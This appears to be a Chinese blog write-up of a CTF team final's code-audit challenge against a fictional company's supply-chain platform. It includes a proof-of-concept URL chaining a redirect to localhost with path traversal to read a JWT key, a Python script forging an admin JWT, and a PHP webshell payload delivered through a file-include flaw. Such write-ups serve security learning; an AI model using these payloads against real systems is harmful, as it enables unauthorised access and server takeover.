---
title: 第四届数信杯团体决赛之代码审计
url: https://mp.weixin.qq.com/s/mTubnsRfDJ51IMf_rVhjqg
source: Doonsec's feed
date: 2026-11-07
fetch_date: 2026-11-08T08:13:41.448165
---

# 第四届数信杯团体决赛之代码审计

# 第四届数信杯团体决赛之代码审计

原创

一只岸上的鱼
一只岸上的鱼

一只岸上的鱼

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 第四届数信杯团体决赛之代码审计

## 缘起

靠着大模型的能力，混进了决赛。

决赛是线下局域网赛，成绩不咋样，不过团体赛，混个前半段，对公司也算有个交代了，简单回顾一下。

## 题目

题目是那种过关的类型，一道一道道，只要卡住一道，立刻就gg了。

```
code

寰宇科技集团总部位于浣熊市高新技术产业园区寰宇大道 1 号，以“智能驱动、绿色高效”为理念，业务覆盖能源技术、自动化系统、机械装备与信息技术，为工业制造、基础设施及能源管理领域提供从核心装备到数字化管控的一体化解决方案。
集团这些年不断扩张，系统也越堆越多：对外有供应链协同平台和集团官网，内部有 OA、视频监控、文档处理、授权管理，还有刚上线不久的单点登录，以及数据存储、缓存和一台 Vue 小站。它们承载着集团的日常运转，也藏着一些不该被外人看见的东西。
你将以外部攻击者的身份走进这张网络，把藏在系统深处的 flag 逐一找出来。
```

任务：

```
code

任务1：获取"寰宇科技集团"供应链协同平台网站联调账号，flag为联调账号的账号密码，格式为flag{账号/密码}

任务2：获取"寰宇科技集团"供应链协同平台网站所使用的JWT密钥，flag为JWT密钥值，格式为flag{xxx}

任务3：获取"寰宇科技集团"供应链协同平台系统控制权，flag为root目录下的flag.txt文件内容，格式为flag{xxx}
```

## 思路与题解

### 任务一：

任务一很简单，签到题，右键源码即可。

### 任务二：

web网站，先扫描不为过

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RJrNBTwulvdP6WUzL4bBV403LqTvBFodGbjo0zYPqIJvcGFKZ9xS4MCUQqQIdibB5Cey25mT1WpVxSAAeae6FT8pso50veLvG7icUUiac1xic3M/640?wx_fmt=png&from=appmsg)

那就很明显了，要代码审计。

先找到了这个需要读取的文件，那就是需要文件包含，或者文件读取

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RJrNBTwulvcayo1Ofc8icELB7bUO7VnL35wx9UD6iarwdNNbUZnLdkfVdnHSTgxLibNBLQv8dGtdWmEYtictyx0alPRia7xVXdbDlicAD8H3hBnoA/640?wx_fmt=png&from=appmsg)

代码文件并不多，很容易发现这里：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RJrNBTwulvfT9oZNmIqduqN0DTBbVs2vGZyacqIAlFUdfzicb4mRwEdD1fBPHwZULU1eo0vNgQDVzxBek0OAF03ebsb436pLFpGgSkhP0p5I/640?wx_fmt=png&from=appmsg)

这是一个读取文件内容的：

![](https://mmbiz.qpic.cn/mmbiz_png/RJrNBTwulvelO2d5X0SEpUCfCDoDWMfR401V5ic2o4FdwGXoiaH9Sw14fiac65zIicibmryfMLtHz13EOh2Wm8lzCWYuiaGdpQicxr3ibPyTD8EzR90/640?wx_fmt=png&from=appmsg)

不过，看目录名字：internal 内部的，很明显，这个地址直接访问肯定是无法访问的。同时源码中也有提示，也提示了内网的端口：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RJrNBTwulveyEFghwPQ7mMmgtCJVr8JLezpshzCQZ1F24Ik6xS36baFa3GOWwSs2bDdZapobF4MtiadBUibvBykGUR2P1DKnf7MdBGBgjlcRk/640?wx_fmt=png&from=appmsg)

打开系统页面，登录后也很简单，只有一个页面，不看源码也只能有一个利用点，就是通过这个系统功能将文件读取到备份，然后通过这个页面下载备份到文件。

![](https://mmbiz.qpic.cn/mmbiz_png/RJrNBTwulvcvfkZU8cVtPh5NUuAkz8tPwDOvMOCcpwfQL0mk62IeXP5wbf2V1NNCZH7UBS8qLdNzQiaYXgLmtOTxcEibFOfFCzH9RzrIDdVyk/640?wx_fmt=png&from=appmsg)

poc也就出来了：

```
code

http://cache.rebind.huanyutech.cn/jump.php?url=http://127.0.0.1:8081/debug/preview.php?file=....//....//....//opt/supplylink/config/jwt.key
```

下载下来就看到答案了：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RJrNBTwulvd6eG5ibJvPO3Sn8LA6AIGSadSJcboVftG1IOaxiaHn65ydJ9xgDH9Mxc7rMkRBYawd8TbicdPPg02Ps96wOopWhbgF69yiaeS4Oibc/640?wx_fmt=png&from=appmsg)

有了这个key，根据源码就可以伪造admin到jwt了，不过admin用户的uid，需要先使用相同的办法把sqlite数据库文件下载下来找一下，当然也可以多猜几个，因为值就是2

```
python

import hmac, hashlib, base64, json, time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

key = b"JStar_Global_Technology"
now = int(time.time())
header = json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':'))
claims = json.dumps({"uid":2,"sub":"admin","role":"admin","iat":now,"exp":now+28800}, separators=(',',':'))
head = b64url(header.encode())
body = b64url(claims.encode())
sig = b64url(hmac.new(key, head.encode()+b'.'+body.encode(), hashlib.sha256).digest())
print(f"{head}.{body}.{sig}")
```

***据说这个jwt是可以另一个系统共用的，不过这个没试。***

### 任务三：

这题已经到最后了，没来及做出截图，只说一下解题思路和办法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RJrNBTwulvd39wDe5RTTAAwPbSFN5WoS9ibiaPFBQr0zj4JuFfWHPjkkibazHP82yaPyDRuZ1CQMKk2SkP1OIx9zMMXurxtb4wxeakia4NcNBaY/640?wx_fmt=png&from=appmsg)

第35行，使用 `include $target`而非 `readfile()`，若被包含文件中含有 PHP 代码即被执行。本系统恰好提供了完美的载荷投递渠道——`import.php`允许用户把**任意内容**（含 `<?php system($_GET['c']); ?>`之类的 Webshell）写入 `/var/www/supplylink/storage/imports/<随机名>.txt`，且**随机存储文件名直接显示在用户的工作台页面上**（dashboard.php:77），攻击者对文件路径完全可知

## 小结

很意外的靠着大模型进的决赛，也果然没能得奖，不过也不枉此行，毕竟有收获。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/ZG8Fru1tL1whh58JUwn0GLYzvqhGcECfmoW1O5J0JY0h7tksUWibmqwhwmEkL7kf1TTb37avJialEYsc7GfDhBCw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过